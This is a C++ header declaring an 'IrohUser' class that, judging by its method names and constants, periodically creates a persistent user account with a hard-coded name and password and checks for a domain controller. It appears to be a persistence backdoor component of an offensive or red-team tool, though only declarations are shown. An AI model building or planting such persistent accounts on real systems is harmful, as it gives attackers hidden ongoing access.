#ifndef IROH_IROHLIBRARY_IROH_USER_H
#define IROH_IROHLIBRARY_IROH_USER_H

#pragma comment(lib, "Netapi32.lib")

#include<Windows.h>
#include <DSRole.h>
#include <LM.h>

#include <string>

#define DEFAULT_USERNAME L"Iroh"
#define DEFAULT_PASSWORD L"Password-123!"
#define DEFAULT_SLEEPTIMER 15000

namespace Iroh {

	class IrohUser
	{
	public:	
		IrohUser();
		VOID SetUsername(std::string);
		VOID SetPassword(std::string);
		VOID SetSleepTime(INT);
		VOID Start();

	private:
		std::wstring username;
		std::wstring password;
		INT sleepTime;

		VOID UserLoop();
		VOID CreatePersistentUser();
		BOOL IsDomainController();
		std::wstring GetDomainName();

	};

}

#endif // !IROH_IROHLIBRARY_IROH_USER_H
